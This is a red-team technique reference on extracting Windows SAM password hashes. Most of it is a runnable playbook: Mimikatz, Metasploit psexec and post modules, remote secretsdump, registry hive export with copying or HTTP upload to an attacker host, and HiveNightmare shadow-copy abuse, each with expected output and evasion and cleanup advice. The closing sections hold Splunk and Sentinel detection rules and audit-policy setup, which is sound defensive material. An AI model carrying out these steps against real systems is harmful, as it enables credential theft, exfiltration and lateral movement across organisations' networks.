# [CA-DUMP-005]: SAM Database Extraction

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-DUMP-005 |
| **MITRE ATT&CK v18.1** | [T1003.002 - Security Account Manager](https://attack.mitre.org/techniques/T1003/002/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows Endpoint (XP, Vista, 7, 8, 10, 11, Server 2003-2025) |
| **Severity** | Critical |
| **CVE** | CVE-2021-36934 (HiveNightmare/SeriousSAM) - optional, technique itself has no CVE |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-02 |
| **Affected Versions** | Windows XP, Vista, 7, 8, 10, 11, Server 2003, 2008, 2012, 2016, 2019, 2022, 2025 |
| **Patched In** | N/A (inherent design - no official patch exists) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** All section numbers have been dynamically renumbered based on applicability to SAM database extraction.

---

## 2. EXECUTIVE SUMMARY

**Concept:** The Security Account Manager (SAM) database is a local registry hive that stores NT/NTLM password hashes for all local user accounts on a Windows system, including the built-in Administrator account. These hashes are encrypted using a system key (SysKey) derived from the SYSTEM registry hive. An attacker with SYSTEM-level privileges can extract the SAM hive and decrypt it using the SysKey, obtaining plaintext-equivalent material that can be used for password cracking, Pass-the-Hash attacks, or immediate credential reuse. Unlike domain accounts stored in NTDS.dit, these local account hashes are persistent and reused across systems, making SAM extraction a high-value target for lateral movement and credential harvesting.

**Attack Surface:** The primary attack surface is the Windows registry hive at `HKLM\SAM` and the physical file at `C:\Windows\System32\config\SAM`. The file is locked during normal Windows operation, but can be accessed via registry export tools (reg.exe), in-memory techniques targeting LSASS, volume shadow copies, or offline access to backup copies stored in `C:\Windows\Repair\SAM`. Three distinct extraction methods exist: direct registry access, in-memory LSASS dumping, and VSS exploitation (CVE-2021-36934).

**Business Impact:** **Complete credential compromise and lateral movement across domain-joined systems.** Local administrator account hashes, once extracted, can be cracked offline or used directly for Pass-the-Hash attacks. Because local administrator credentials are frequently reused across multiple systems within an organization, compromising a single system's SAM grants the attacker potential access to dozens of other systems. This is particularly damaging in AD environments where local admins often hold sensitive system access.

**Technical Context:** SAM extraction typically occurs post-compromise as part of the credential harvesting phase. The operation is fast (seconds), but highly detectable if registry auditing is enabled. Extraction can occur remotely via administrative SMB shares (secretsdump.py) or locally via tools like Mimikatz. Modern protections (Windows 10/11 with latest patches) have mitigated CVE-2021-36934, but the core vulnerability remains exploitable with proper privileges.

### Operational Risk

- **Execution Risk:** Medium - Requires SYSTEM privileges; in-memory techniques may be caught by AMSI/EDR
- **Stealth:** Low - Registry access to SAM/SYSTEM hives generates Event IDs 4656/4663 if auditing enabled; Mimikatz is heavily detected
- **Reversibility:** No - Once compromised, hash cannot be "uncracked"; requires password change domain-wide

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 4.3.2 | Ensure that local administrator accounts have complex, unique passwords |
| **DISA STIG** | WN10-00-000020 | The system must enforce password history of at least 24 passwords |
| **CISA SCuBA** | Authentication | Enforce MFA; use Local Administrator Password Solution (LAPS) |
| **NIST 800-53** | IA-2 | Identification and authentication; IA-5 Authenticator Management; AC-3 Access Enforcement |
| **GDPR** | Article 32 | Security of processing - implement appropriate technical measures |
| **DORA** | Article 9 | Protection and prevention of ICT incidents affecting financial entities |
| **NIS2** | Article 21 | Cyber risk management measures for critical infrastructure operators |
| **ISO 27001** | A.9.2.1 | Restrict access to information and information processing facilities |
| **ISO 27001** | A.9.4.3 | Password management system - user responsibility |
| **ISO 27005** | Section 7.4 | Risk assessment of credential compromise from local privilege abuse |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** SYSTEM (`NT AUTHORITY\SYSTEM`) for in-memory techniques; Administrator+ for registry export; potentially no privileges for CVE-2021-36934 (VSS exploitation).

**Required Access:** Local system access (local admin equivalent); network access to port 445 (for remote secretsdump.py); file system access to `%SystemRoot%\System32\config\`.

**Supported Versions:**
- **Windows:** XP, Vista, 7, 8, 8.1, 10, 11, Server 2003, 2008 R2, 2012, 2012 R2, 2016, 2019, 2022, 2025
- **PowerShell:** 2.0+ (for reconnaissance; 5.0+ recommended for advanced operations)
- **Python:** 3.6+ (for secretsdump.py)

**Tools:**
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Version 2.0.0+)
- [Metasploit Framework](https://www.metasploit.com/) (Module: post/windows/gather/sam)
- [secretsdump.py](https://github.com/SecureAuthCorp/impacket) (Impacket library 0.9.19+)
- [Creddump7](https://github.com/CiscoCXSecurity/creddump7) (Python tool for SAM decryption)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (Integrated secretsdump)
- Native Windows tools: `reg.exe`, `cmd.exe`, `vssadmin.exe` (for CVE-2021-36934)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Registry Reconnaissance – PowerShell

**Check SAM hive accessibility and version:**

```powershell
# Verify if SAM hive is accessible
reg query HKLM\SAM

# If "Access Denied" - requires SYSTEM or admin elevation
# If successful - hive is readable

# Check system version (determine hash format)
(Get-WmiObject Win32_OperatingSystem).Version

# Windows XP/Server 2003: May have LM hashes
# Windows Vista/Server 2008+: NT/NTLM hashes only (no LM by default)
```

**What to Look For:**
- "Access Denied" indicates insufficient privileges (need SYSTEM)
- Successful registry read indicates potential SAM availability
- Windows version determines hash types (LM vs NT/NTLM)

**Version Note:** SAM structure is identical across Vista-Server 2025; only hash encryption method (SysKey) is consistent.

### Verify Administrator Privileges

```powershell
# Check if running as administrator
$admin = [Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()
if ($admin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
  Write-Host "Running as Administrator" } else { Write-Host "Not Administrator" }

# Check if SYSTEM can be impersonated
whoami
# Expected for direct access: NT AUTHORITY\SYSTEM
# For admin: DOMAIN\Administrator or similar
```

**What to Look For:**
- Administrator status (for registry export via reg.exe)
- SYSTEM status (for Mimikatz lsadump::sam)
- Token elevation capability

### Check for Backup SAM Files

```powershell
# Check for backup copies (accessible without locking issues)
Test-Path C:\Windows\Repair\SAM
Get-Item -Path C:\Windows\Repair\* -ErrorAction SilentlyContinue | Select-Object Name, LastWriteTime

# Check for recovery backups
vssadmin list shadows

# If VSS available, attacker can extract SAM from snapshots (CVE-2021-36934)
```

**What to Look For:**
- Backup SAM files in C:\Windows\Repair\ (older systems)
- Volume Shadow Copies present (exploitation vector)
- File permissions on backup files

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Using Mimikatz (Direct Registry/Memory Access)

**Supported Versions:** All Windows versions (XP through Server 2025)

**Prerequisites:** SYSTEM privileges or Administrator with SeDebugPrivilege

#### Step 1: Launch Mimikatz with Elevated Privileges

**Objective:** Execute Mimikatz in elevated context to access protected registry hives.

**Command (All Versions):**

```cmd
mimikatz.exe
```

Or from PowerShell reverse shell with SYSTEM context:

```powershell
# Ensure SYSTEM context
$SecurityContext = [Security.Principal.WindowsIdentity]::GetCurrent()
Write-Host $SecurityContext.Name

# Launch Mimikatz
& "C:\tools\mimikatz.exe"
```

**Expected Output:**

```
  .#####.   mimikatz 2.2.0 (x64) built on Nov  6 2021 17:53:59
 .## ^ ##.
 ## / \ ##  /*** The one and only Mimikatz
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   https://twitter.com/gentilkiwi
  '#####.    https://github.com/gentilkiwi/mimikatz (oe.eo)

mimikatz #
```

**What This Means:**
- Prompt shows `mimikatz #` indicating successful launch
- Ready to execute SAM dumping modules

**OpSec & Evasion:**
- Mimikatz is signature-detected by all major AV/EDR
- Consider obfuscation, in-memory execution, or alternatives
- Detection likelihood: **Critical (Very High)**

#### Step 2: Enable Debug Privilege

**Objective:** Grant Mimikatz permission to access protected system structures.

**Command (All Versions):**

```
mimikatz # privilege::debug
```

**Expected Output:**

```
Privilege '20' OK
```

**What This Means:**
- "OK" indicates SeDebugPrivilege successfully enabled
- Now can access protected memory and registry structures
- ERROR would indicate insufficient privileges

**OpSec & Evasion:**
- privilege::debug is logged and detected by EDR
- Some EDR systems immediately alert on this
- Detection likelihood: **High**

#### Step 3: Execute lsadump::sam (In-Memory Access)

**Objective:** Extract SAM hashes directly from system memory without registry export.

**Command (All Versions - Direct):**

```
mimikatz # lsadump::sam
```

**Expected Output:**

```
Domain : WORKSTATION01
SysKey : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6

Local name : WORKSTATION01 ( S-1-5-21-1234567890-1234567890-1234567890 )
Domain name : WORKSTATION01
Domain FQDN : WORKSTATION01

[SAM]
RID  : 000001F4 (500)
User : Administrator
Hash NTLM: 8846f7eaee8fb117ad06bdd830b7586c

RID  : 000001F5 (501)
User : Guest
Hash NTLM: aad3b435b51404eeaad3b435b51404ee

RID  : 000003E8 (1000)
User : jsmith
Hash NTLM: d0352ee2e8a0aa9ad8f0f2f4ea6ac5d1

RID  : 000003E9 (1001)
User : mwallace
Hash NTLM: 3dbbe83f426b7d7f1e4a8e42b2d5c9f7
```

**What This Means - Line by Line:**
- **Domain / SysKey:** Local system identifier and encryption key
- **Local name:** Computer name and SID
- **[SAM]:** Start of local account listing
- **RID:** Relative ID (500=Admin, 501=Guest, 1000+=users)
- **User:** Local account username
- **Hash NTLM:** The actual NT/NTLM hash (usable for cracking or Pass-the-Hash)
- **aad3b435b51404eeaad3b435b51404ee:** Null LM hash (indicates no LM hash set)

**OpSec & Evasion:**
- Direct memory access is extremely detectable
- LSASS process has SACL enabled on modern Windows
- Detection likelihood: **Critical (Very High)**

**Troubleshooting:**

| Error | Cause | Fix |
|-------|-------|-----|
| `ERROR kuhl_m_lsadump_sam ; GetSamKey` | Insufficient privileges | Run Mimikatz as SYSTEM via psexec -s or token impersonation |
| `No user found` | SAM hive empty or inaccessible | Verify SYSTEM privileges; try offline method (Step 4) |
| `Access Denied` | Registry DACL restricts access | Ensure full SYSTEM context; may require kernel access |

#### Step 4: Execute lsadump::sam (Offline Registry Hives)

**Objective:** Decrypt SAM using exported registry hives (more evasive than in-memory).

**Command (All Versions - Offline):**

```
mimikatz # lsadump::sam /sam:C:\temp\SAM /system:C:\temp\SYSTEM
```

**Expected Output:**

```
[SAM] local offset is 0x000fc010
[SAM] User : Administrator RID = 500
[SAM]   Hash NTLM: 8846f7eaee8fb117ad06bdd830b7586c

[SAM] User : Guest RID = 501
[SAM]   Hash NTLM: aad3b435b51404eeaad3b435b51404ee

[SAM] User : jsmith RID = 1000
[SAM]   Hash NTLM: d0352ee2e8a0aa9ad8f0f2f4ea6ac5d1
```

**What This Means:**
- Offline decryption (no LSASS access required)
- More evasive than in-memory dump
- Same hash format as direct method
- Slower but lower detection profile

**OpSec & Evasion:**
- Lower detection than in-memory but still suspicious if registry hives on disk
- Recommended method for evasion
- Detection likelihood: **Medium-High**

---

### METHOD 2: Using Metasploit – SAM Post Module

**Supported Versions:** Windows XP through Server 2025

**Prerequisites:** Meterpreter session with SYSTEM privileges

#### Step 1: Establish Meterpreter Session

**Objective:** Gain Meterpreter shell with elevated privileges.

**Command (via MSFConsole):**

```
msfconsole
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.1.100
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
msf6 exploit(windows/smb/psexec) > set SMBPass Password123!
msf6 exploit(windows/smb/psexec) > set LHOST 192.168.1.50
msf6 exploit(windows/smb/psexec) > set LPORT 4444
msf6 exploit(windows/smb/psexec) > exploit

[*] Meterpreter session 1 opened (192.168.1.50:4444 -> 192.168.1.100:49152)
```

**What This Means:**
- Successful exploit grants system-level shell
- Session ID used for subsequent modules
- Connection established for post-exploitation

#### Step 2: Load and Execute SAM Dumping Module

**Objective:** Use Metasploit's built-in SAM extraction module.

**Command (All Versions):**

```
meterpreter > background
msf6 > use post/windows/gather/sam
msf6 post(windows/gather/sam) > set SESSION 1
msf6 post(windows/gather/sam) > run
```

**Expected Output:**

```
[*] Running module against WORKSTATION01
[*] Dumping SAM database
[+] Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
[+] Guest:501:aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee:::
[+] jsmith:1000:aad3b435b51404eeaad3b435b51404ee:d0352ee2e8a0aa9ad8f0f2f4ea6ac5d1:::
[+] mwallace:1001:aad3b435b51404eeaad3b435b51404ee:3dbbe83f426b7d7f1e4a8e42b2d5c9f7:::
[*] Saving hashes to /root/.msf4/loot/20260102_143022_192.168.1.100_windows.sam_credentials_123456.txt
[*] Post module execution completed
```

**What This Means:**
- Format: Username:RID:LM_Hash:NTLM_Hash:::
- LM_Hash present if legacy system; usually shows null hash (aad3b...)
- NTLM_Hash is the crackable/passable hash
- Hashes automatically saved to loot directory

**OpSec & Evasion:**
- Metasploit post modules are detectable by EDR
- Less noisy than direct Mimikatz but still flagged
- Detection likelihood: **Medium-High**

---

### METHOD 3: Using secretsdump.py (Impacket) – Remote via SMB

**Supported Versions:** All Windows versions

**Prerequisites:** Valid credentials, network access to SMB (port 445), Python 3.6+

#### Step 1: Remote Dump via Authenticated SMB Access

**Objective:** Extract SAM remotely using admin credentials.

**Command (All Versions - Remote):**

```bash
# Remote extraction with credentials
python3 -m impacket.examples.secretsdump \
  -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \
  Administrator@192.168.1.100

# Or with plaintext password
python3 -m impacket.examples.secretsdump \
  Administrator:Password123!@192.168.1.100
```

**Expected Output:**

```
Impacket v0.9.25 - Copyright 2021 SecureAuth Corporation

[*] Dumping SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee:::
jsmith:1000:aad3b435b51404eeaad3b435b51404ee:d0352ee2e8a0aa9ad8f0f2f4ea6ac5d1:::
mwallace:1001:aad3b435b51404eeaad3b435b51404ee:3dbbe83f426b7d7f1e4a8e42b2d5c9f7:::
```

**What This Means:**
- Remote extraction over SMB (no local access needed)
- Extremely evasive compared to local tools
- Can extract from multiple systems in parallel
- SMB traffic is the primary IOC

**OpSec & Evasion:**
- Network-based (harder to detect on endpoint)
- SMB traffic logs will show failed/successful auth
- SIEM/Network IDS may detect suspicious SMB patterns
- Detection likelihood: **Medium** (if network monitored)

#### Step 2: Offline Decryption from Exported Hives

**Objective:** Decrypt SAM using locally saved hive files.

**Command (All Versions - Offline):**

```bash
# Offline decryption
python3 -m impacket.examples.secretsdump \
  -sam SAM.hive -system SYSTEM.hive -security SECURITY.hive LOCAL

# Or simpler (SAM + SYSTEM only)
python3 -m impacket.examples.secretsdump \
  -sam SAM.hive -system SYSTEM.hive LOCAL
```

**Expected Output:**

```
Impacket v0.9.25 - Copyright 2021 SecureAuth Corporation

[*] Dumping SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee:::
jsmith:1000:aad3b435b51404eeaad3b435b51404ee:d0352ee2e8a0aa9ad8f0f2f4ea6ac5d1:::
```

**What This Means:**
- Most evasive method (fully offline)
- No process execution on target during decryption
- Can be run on attacker's machine
- Only IOC is network exfiltration of hive files

---

### METHOD 4: Manual Registry Export and Offline Decryption

**Supported Versions:** All Windows versions

**Prerequisites:** Administrator/SYSTEM privileges; ability to export registry

#### Step 1: Export SAM and SYSTEM Registry Hives

**Objective:** Save registry hives to temporary location for transport.

**Command (All Versions - from admin cmd.exe):**

```cmd
reg save hklm\sam C:\temp\SAM.hive
reg save hklm\system C:\temp\SYSTEM.hive
reg save hklm\security C:\temp\SECURITY.hive
```

Or via PowerShell:

```powershell
# Requires admin/SYSTEM
$TempPath = "C:\temp"
if (-not (Test-Path $TempPath)) { New-Item -ItemType Directory -Path $TempPath }

reg save hklm\sam "$TempPath\SAM.hive"
reg save hklm\system "$TempPath\SYSTEM.hive"
reg save hklm\security "$TempPath\SECURITY.hive"

Write-Host "Hive files saved to $TempPath"
```

**Expected Output:**

```
The operation completed successfully.
```

**What This Means:**
- Hive files now stored in temporary directory
- Encrypted with SysKey (contained in SYSTEM hive)
- Ready for exfiltration to attacker machine
- Still locked to target system

**OpSec & Evasion:**
- Registry export generates Event ID 4663 if auditing enabled
- File creation in C:\temp is relatively low-profile
- Recommended cleanup: Delete files after exfiltration
- Detection likelihood: **Medium** (if registry auditing active)

#### Step 2: Exfiltrate Hive Files to Attacker Machine

**Objective:** Transfer encrypted hive files to attacker-controlled system.

**Command (Windows - via SMB share):**

```cmd
# Copy to attacker share
copy C:\temp\SAM.hive \\192.168.1.50\share\SAM.hive
copy C:\temp\SYSTEM.hive \\192.168.1.50\share\SYSTEM.hive
```

Or PowerShell:

```powershell
# Copy via SMB
$AttackerShare = "\\192.168.1.50\share"
Copy-Item "C:\temp\SAM.hive" -Destination "$AttackerShare\SAM.hive"
Copy-Item "C:\temp\SYSTEM.hive" -Destination "$AttackerShare\SYSTEM.hive"

# Or over HTTP (if web shell available)
Invoke-WebRequest -Uri "http://192.168.1.50:8080/upload" `
  -Method Post -InFile "C:\temp\SAM.hive"
```

**What This Means:**
- Hives now on attacker machine
- Network exfiltration detected if monitored
- Cleanup: `Remove-Item C:\temp\*.hive -Force`
- Detection likelihood: **Medium-High** (SMB/network traffic)

#### Step 3: Decrypt Hives Offline on Attacker Machine

**Objective:** Crack SAM hashes using extracted hive files.

**Command (Linux/Kali - Mimikatz):**

```bash
# Copy hive files to working directory
cd /tmp/hives

# Option 1: secretsdump.py (recommended)
python3 -m impacket.examples.secretsdump \
  -sam SAM.hive -system SYSTEM.hive LOCAL

# Option 2: Mimikatz (Windows or Wine)
mimikatz.exe 'lsadump::sam /sam:SAM.hive /system:SYSTEM.hive' 'exit'
```

**Expected Output:**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee:::
jsmith:1000:aad3b435b51404eeaad3b435b51404ee:d0352ee2e8a0aa9ad8f0f2f4ea6ac5d1:::
```

**What This Means:**
- Hashes extracted without any activity on target system
- Ready for password cracking or Pass-the-Hash
- Fully offline (no network IOCs during cracking)
- Detection likelihood: **None** (offline operation)

---

### METHOD 5: CVE-2021-36934 (HiveNightmare) – Volume Shadow Copy Exploitation

**Supported Versions:** Windows 10 (1809 and later), Windows 11 (if unpatched)

**Prerequisites:** Local user access (no admin/SYSTEM required!); VSS snapshots must exist

#### Step 1: List Available Volume Shadow Copies

**Objective:** Enumerate accessible VSS snapshots.

**Command (Any User Privileges):**

```cmd
vssadmin list shadows
```

**Expected Output:**

```
Vss Writer Name: System Writer
   Shadow Copy ID: {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
   Shadow Copy Set ID: {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
   Original Volume: C:\
   Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
   Original System Volume: C:\
   Shadow Copy Attributes: Persistent, Client-Accessible, No Auto Release, Differential
```

**What This Means:**
- VSS snapshots contain copies of system files (including locked SAM)
- `HarddiskVolumeShadowCopy1` = accessible snapshot
- Multiple snapshots may be available
- No authentication required (any user can list)

#### Step 2: Create Symbolic Link to VSS SAM File

**Objective:** Access SAM file from VSS snapshot (bypasses file locking).

**Command (Any User Privileges):**

```cmd
# Create link to VSS SAM
mklink "C:\temp\SAM_VSS" "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM"

# Create link to VSS SYSTEM
mklink "C:\temp\SYSTEM_VSS" "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM"
```

Or via PowerShell:

```powershell
# Create symbolic links
$VSSPath = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config"

cmd /c mklink C:\temp\SAM_VSS "$VSSPath\SAM"
cmd /c mklink C:\temp\SYSTEM_VSS "$VSSPath\SYSTEM"
```

**Expected Output:**

```
symbolic link created for C:\temp\SAM_VSS <<=> \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
```

**What This Means:**
- Symbolic links created (appear as normal files)
- VSS files now accessible without file locks
- Can copy as regular files
- **No SYSTEM privileges required** (major advantage!)

**OpSec & Evasion:**
- mklink or fsutil commands are suspicious if monitored
- Will generate Event IDs if command auditing enabled
- However, many systems lack advanced command auditing
- Detection likelihood: **Medium** (process audit logs may miss)

#### Step 3: Copy VSS Files and Extract Hashes

**Objective:** Extract hashes from VSS-sourced files.

**Command (Any User Privileges):**

```cmd
# Copy from VSS links
copy "C:\temp\SAM_VSS" "C:\temp\SAM.hive"
copy "C:\temp\SYSTEM_VSS" "C:\temp\SYSTEM.hive"

# Use secretsdump or Mimikatz offline
# (same as METHOD 4, Step 3)
```

**What This Means:**
- SAM hashes obtained without admin/SYSTEM privileges
- This is the strength of CVE-2021-36934
- Allows privilege escalation + credential harvesting in one step
- Requires VSS snapshots to exist (common on systems with backups)

---

## 6. ATTACK SIMULATION & VERIFICATION

#### Atomic Red Team – T1003.002

**Atomic Test ID:** T1003.002-1 (Dump SAM registry hive)

**Test Name:** SAM Database Extraction via Registry

**Description:** Demonstrates extraction of SAM hashes using reg.exe and Creddump7.

**Supported Versions:** All Windows versions

**Command:**

```powershell
Invoke-AtomicTest T1003.002 -TestNumbers 1
```

Or manually:

```powershell
# Atomic simulation - Manual SAM dump
reg save hklm\sam C:\temp\SAM
reg save hklm\system C:\temp\SYSTEM

# Decode using creddump7
python3 /usr/share/creddump7/pwdump.py C:\temp\SYSTEM C:\temp\SAM
```

**Cleanup Command:**

```powershell
Remove-Item C:\temp\SAM -Force
Remove-Item C:\temp\SYSTEM -Force
```

**Reference:** [Atomic Red Team Repository](https://github.com/redcanary/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md)

---

## 7. TOOLS & COMMANDS REFERENCE

### Mimikatz – lsadump::sam Module

**Version:** 2.2.0 (current as of 2026)

**Minimum Version:** 2.0.0

**Supported Platforms:** Windows XP-2025 (x86, x64)

**Installation:**

```powershell
# Download latest release
$Url = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0/mimikatz_trunk.zip"
Invoke-WebRequest -Uri $Url -OutFile mimikatz.zip
Expand-Archive mimikatz.zip -DestinationPath C:\tools\
```

**Usage:**

```
mimikatz # lsadump::sam
mimikatz # lsadump::sam /sam:C:\temp\SAM /system:C:\temp\SYSTEM
```

---

### secretsdump.py (Impacket)

**Version:** 0.9.25+

**Supported Platforms:** Linux, macOS, Windows (Python); targets all Windows

**Installation:**

```bash
pip install impacket
# or
git clone https://github.com/SecureAuthCorp/impacket.git && cd impacket && pip install -e .
```

**Usage:**

```bash
# Remote extraction
python3 -m impacket.examples.secretsdump Administrator:Password@192.168.1.100

# Offline from hives
python3 -m impacket.examples.secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL
```

---

### Creddump7

**Version:** Latest (maintained)

**Installation:**

```bash
sudo apt install creddump7
# or
pip install creddump7
```

**Usage:**

```bash
# Dump hashes from SAM/SYSTEM
creddump7/pwdump.py SYSTEM SAM
```

---

### One-Liner Script (PowerShell + Registry Export)

```powershell
# Automated SAM extraction and immediate decryption
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
  Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs
  exit
}
# Now elevated
$TempDir = "C:\temp"
reg save hklm\sam "$TempDir\SAM" 2>&1
reg save hklm\system "$TempDir\SYSTEM" 2>&1
Write-Host "Hives saved. Ready for offline decryption."
# Cleanup after exfiltration
# Remove-Item "$TempDir\SAM" -Force
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: SAM Registry Hive Access via reg.exe

**Rule Configuration:**
- **Required Index:** main (Windows Security logs)
- **Required Sourcetype:** WinEventLog:Security
- **Required Fields:** EventCode, CommandLine, Image
- **Alert Threshold:** > 0 events (immediate)
- **Applies To Versions:** All

**SPL Query:**

```spl
index=main sourcetype="WinEventLog:Security" EventCode=4688 
  (CommandLine="*reg*save*hklm\sam*" OR 
   CommandLine="*reg*save*hklm\system*" OR
   CommandLine="*reg*export*sam*" OR
   CommandLine="*reg*export*system*")
| stats count by host, User, CommandLine
| where count >= 1
```

**What This Detects:**
- Process execution of reg.exe with SAM/SYSTEM hive arguments
- Line 1-3: Filter for Security logs and process creation events (EventCode 4688)
- Line 4-6: Match specific command patterns targeting SAM/SYSTEM hives
- Line 7-8: Alert on any match (these are high-confidence indicators)

**Manual Configuration Steps:**

1. Log into **Splunk Web** → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste the SPL query above
5. Set **Trigger Condition** to `Number of events > 0`
6. Configure **Action** → Send email to SOC team
7. Save as: `WinSec - SAM Registry Export Attempt`

---

### Rule 2: Mimikatz Process Execution or Suspicious LSASS Access

**Rule Configuration:**
- **Required Index:** main
- **Required Sourcetype:** WinEventLog:Security
- **Required Fields:** EventCode, Image, CommandLine
- **Alert Threshold:** Immediate
- **Applies To Versions:** All

**SPL Query:**

```spl
index=main sourcetype="WinEventLog:Security" EventCode=4688
  (Image="*mimikatz*" OR 
   CommandLine="*lsadump::sam*" OR
   CommandLine="*lsadump*" OR
   Image="*secretsdump*" OR
   Image="*creddump*")
| stats count by host, User, Image, CommandLine
```

**What This Detects:**
- Mimikatz binary execution with known module names
- secretsdump or creddump execution on endpoint
- Known credential dumping tool signatures

**False Positive Analysis:**
- **Legitimate Activity:** Authorized security assessments
- **Benign Tools:** None (these are exclusively offensive tools)
- **Tuning:** Exclude whitelisted security team processes by User

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: Process Execution – SAM Registry Dumping Patterns

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID, CommandLine, Image
- **Alert Severity:** Critical
- **Frequency:** Real-time (1 minute)
- **Applies To Versions:** All Windows versions

**KQL Query:**

```kusto
SecurityEvent
| where EventID == 4688
| where (CommandLine has "reg" and CommandLine has "save" and CommandLine has_any ("sam", "system", "security")) or
        (CommandLine has_any ("mimikatz", "lsadump", "secretsdump", "creddump", "cachedump"))
| extend AccountCustomEntity = Account
| extend HostCustomEntity = Computer
| extend ProcessPath = NewProcessName
| project TimeGenerated, Computer, Account, Image=NewProcessName, CommandLine
| summarize Count = count(), Hosts = dcount(Computer), Users = dcount(Account) by Image, CommandLine
| where Count >= 1
```

**What This Detects:**
- Registry export commands targeting SAM/SYSTEM/SECURITY hives
- Execution of known credential dumping tools
- Unusual command line patterns

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `SAM Extraction - Process Execution Detection`
   - Severity: `Critical`
4. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `1 minute`
   - Lookup data from the last: `10 minutes`
5. **Incident settings Tab:**
   - Enable **Create incidents**
6. Click **Review + create**

---

### Query 2: File Access to SAM Database Files (Event ID 4663)

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID, ObjectName, ProcessName
- **Alert Severity:** High
- **Frequency:** Every 5 minutes

**KQL Query:**

```kusto
SecurityEvent
| where EventID == 4663
| where ObjectName has_any ("SAM", "SYSTEM", "SECURITY") and ObjectName has "System32\\config"
| where ProcessName !contains "System" and ProcessName !contains "Services"
| extend AccountCustomEntity = Account
| extend HostCustomEntity = Computer
| summarize AccessCount = count(), Processes = dcount(ProcessName) by Computer, Account, ObjectName
| where AccessCount >= 1
```

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 4688 (Process Creation)**

- **Log Source:** Security
- **Trigger:** Process execution with suspicious command-line arguments
- **Filter:** `CommandLine contains "reg"` AND `CommandLine contains "save"` AND `(CommandLine contains "sam" OR CommandLine contains "system")`
- **Applies To Versions:** All (Windows 2000+)

**Configuration (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Detailed Tracking**
3. Enable: **Audit Process Creation** (both Success and Failure)
4. Click **Apply**
5. Run `gpupdate /force`
6. Verify: Open **Event Viewer** → **Windows Logs** → **Security** → Filter for Event ID 4688

**Event ID: 4663 (Attempt to Access Object)**

- **Log Source:** Security
- **Trigger:** Attempt to read/write SAM, SYSTEM, or SECURITY registry hive
- **Filter:** `ObjectName contains "SECURITY\SAM"` OR `ObjectName contains "System32\config\SAM"`
- **Applies To Versions:** Windows Vista+ (if SACL configured)

**Configuration (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Object Access**
3. Enable: **Audit Registry** (both Success and Failure)
4. Additionally, set **Audit File System** for tracking file access to `C:\Windows\System32\config\*`
5. Run `gpupdate /force`

**Event ID: 4656 (Handle to Object Requested)**

- **Log Source:** Security
- **Trigger:** Initial request to access SAM registry hive
